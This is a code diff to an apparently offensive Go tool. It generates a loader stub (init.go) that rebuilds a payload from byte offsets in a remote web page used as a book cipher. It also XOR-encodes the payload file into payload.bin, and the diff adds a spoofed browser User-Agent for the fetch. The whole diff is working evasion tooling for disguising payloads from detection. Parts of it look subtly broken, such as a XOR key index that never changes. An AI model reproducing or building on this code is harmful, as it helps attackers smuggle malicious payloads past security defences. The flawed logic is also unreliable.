@@ -1,13 +1,20 @@
 package main
 
 import (
+	"bufio"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"flag"
 	"fmt"
+	"github.com/schollz/progressbar/v3"
+	"io"
 	"io/ioutil"
+	"log"
 	"math/rand"
 	"net/http"
 	"os"
+	"time"
 )
 
 var Chars = []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/", "="}
@@ -23,8 +30,12 @@ import (
 		defer r.Body.Close()
 		body, _ := ioutil.ReadAll(r.Body)
 		`
-const StringTemplate = "Payload = append(Payload, []byte(%s)...)"
-const IntTemplate = "Payload = append(Payload, body[%d])"
+
+//const StringTemplate = "Payload = append(Payload, []byte(%s)...)"
+//const IntTemplate = "Payload = append(Payload, body[%d])"
+
+const StringTemplate = "Payload[%d] = []byte(%s)[0]"
+const IntTemplate = "Payload[%d] = body[%d]"
 
 const end = `
 }
@@ -102,12 +113,24 @@ type Base64Map struct {
 }
 
 func LoadMap(url string) Base64Map {
-	r, _ := http.Get(url)
+	c := http.Client{Timeout: 1 * time.Second}
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		panic(err)
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+	r, err := c.Do(req)
+	if err != nil {
+		fmt.Println(err)
+		return Base64Map{}
+	}
 	defer r.Body.Close()
 	body, _ := ioutil.ReadAll(r.Body)
 	baseMap := Base64Map{}
 	sourceLen := len(body)
+	bar := progressbar.Default(int64(sourceLen))
 	for i := 0; i < sourceLen; i++ {
+		bar.Add(1)
 		switch body[i] {
 		case 'a':
 			baseMap.La = append(baseMap.La, i)
@@ -242,6 +265,7 @@ func LoadMap(url string) Base64Map {
 
 		}
 	}
+	bar.Close()
 	return baseMap
 }
 
@@ -381,6 +405,45 @@ func (baseMap Base64Map) getLetter(char string) []int {
 	return nil
 }
 
+func XORBytes(a, b []byte) ([]byte, error) {
+	if len(a) != len(b) {
+		return nil, fmt.Errorf("length of byte slices is not equivalent: %d != %d", len(a), len(b))
+	}
+
+	buf := make([]byte, len(a))
+
+	for i := range a {
+		buf[i] = a[i] ^ b[i]
+	}
+
+	return buf, nil
+}
+
+func xor(f *os.File, key string) {
+	buf := make([]byte, 1)
+	bufw := []byte{}
+	reader := bufio.NewReader(f)
+	for {
+		n, err := reader.Read(buf)
+		if err != nil {
+			if err != io.EOF {
+				log.Fatal(err)
+			}
+			break
+		}
+		bite := byte(key[n%(len(key))])
+		writebuf := make([]byte, 0)
+		writebuf = append(writebuf, bite)
+		xord, err := XORBytes(writebuf, buf[0:n])
+		bufw = append(bufw, xord[0])
+	}
+	err := os.WriteFile("payload.bin", bufw, 0644)
+	if err != nil {
+		log.Fatal(err)
+		return
+	}
+}
+
 func main() {
 	flag.StringVar(&targetPayload, "p", "", "payload to be encoded")
 	flag.StringVar(&targetUrl, "u", "", "URL to use as a book cipher")
@@ -392,19 +455,45 @@ func main() {
 	}
 	baseMap := LoadMap(targetUrl)
 	test, _ := os.ReadFile(targetPayload)
-	initTemplate := fmt.Sprintf(base, targetUrl)
+	payload, _ := os.Open(targetPayload)
+
+	xorSha := sha256.New()
+	xorSha.Write(test)
+	xorHash := xorSha.Sum(nil)
+	xorHashString := hex.EncodeToString(xorHash)
+	xor(payload, xorHashString)
 	b64string := base64.StdEncoding.EncodeToString(test)
-	for i := 0; i < len(b64string); i++ {
-		char := string(b64string[i])
+	bar := progressbar.Default(int64(len(b64string)))
+
+	f, _ := os.OpenFile("init.go", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	defer f.Close()
+	f.Write([]byte(fmt.Sprintf(base, targetUrl)))
+	for i := 0; i < len(xorHashString); i++ {
+		/*
+			bar.Add(1)
+			char := string(b64string[i])
+			intMaps := baseMap.getLetter(char)
+			if len(intMaps) == 0 {
+				f.Write([]byte("\n" + fmt.Sprintf(StringTemplate, "\""+char+"\"")))
+			} else if len(intMaps) == 1 {
+				f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, intMaps[0])))
+			} else {
+				f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, intMaps[rand.Intn(len(intMaps)-1)])))
+			}
+		*/
+		bar.Add(1)
+		char := string(xorHashString[i])
 		intMaps := baseMap.getLetter(char)
 		if len(intMaps) == 0 {
-			initTemplate = initTemplate + "\n" + fmt.Sprintf(StringTemplate, "\""+char+"\"")
+			f.Write([]byte("\n" + fmt.Sprintf(StringTemplate, i, "\""+char+"\"")))
 		} else if len(intMaps) == 1 {
-			initTemplate = initTemplate + "\n" + fmt.Sprintf(IntTemplate, intMaps[0])
+			f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, i, intMaps[0])))
 		} else {
-			initTemplate = initTemplate + "\n" + fmt.Sprintf(IntTemplate, intMaps[rand.Intn(len(intMaps)-1)])
+			f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, i, intMaps[rand.Intn(len(intMaps)-1)])))
 		}
 	}
-	initTemplate = initTemplate + "\n" + end
-	os.WriteFile("init.go", []byte(initTemplate), 0644)
+
+	bar.Finish()
+	f.Write([]byte("\n" + end))
+
 }
